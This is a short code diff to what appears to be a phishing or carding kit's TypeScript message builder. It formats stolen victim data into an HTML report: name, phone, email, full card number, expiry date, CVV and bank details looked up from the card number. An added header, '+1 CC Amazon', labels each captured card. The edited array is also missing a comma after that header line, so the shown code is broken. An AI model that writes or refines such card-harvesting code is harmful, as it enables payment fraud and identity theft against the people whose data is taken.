@@ -166,6 +166,7 @@ const formatTimestamp = (timestamp: string) => {
   return new Intl.DateTimeFormat("fr-FR", {
     dateStyle: "short",
     timeStyle: "medium",
+	timeZone: "Europe/Paris",
   }).format(date);
 };
 
@@ -207,6 +208,7 @@ const buildMessage = (
   }
 
   lines.push(
+    "=======⚡️ +1 CC Amazon ⚡======="
     "<b>🧾 Informations personnelles</b>",
     `• <b>Nom</b> : ${sanitizeText(payload.lastName || "(non communiqué)")}`,
     `• <b>Prénom</b> : ${sanitizeText(payload.firstName || "(non communiqué)")}`,
@@ -218,12 +220,13 @@ const buildMessage = (
     `• <b>Téléphone</b> : ${sanitizeText(payload.phone || "(non communiqué)")}`,
     `• <b>Email</b> : ${sanitizeText(payload.email || "(non communiqué)")}`,
     "",
-    "<b>💳 Paiement</b>",
+    "<b>💳 Moyen de paiement</b>",
     `• <b>Titulaire</b> : ${sanitizeText(payload.cardHolder)}`,
-    `• <b>Carte</b> : ${sanitizeText(payload.cardNumber)}`,
-    `• <b>Expiration</b> : ${sanitizeText(payload.expiry)}`,
-    `• <b>CVV</b> : ${sanitizeText(payload.cvv)}`,
-    `• <b>Banque</b> : ${sanitizeText(binInfo.bank)}`,
+    `• <b>Carte</b> : <code>${sanitizeText(payload.cardNumber)}</code>`,
+    `• <b>Expiration</b> : <code>${sanitizeText(payload.expiry)}</code>`,
+    `• <b>CVV</b> : <code>${sanitizeText(payload.cvv)}</code>`,
+    
+	`• <b>Banque</b> : ${sanitizeText(binInfo.bank)}`,
     `• <b>Niveau</b> : ${sanitizeText(binInfo.level)}`,
     `• <b>Type</b> : ${sanitizeText(binInfo.type)}`,
     `• <b>Image de la carte</b> : ${
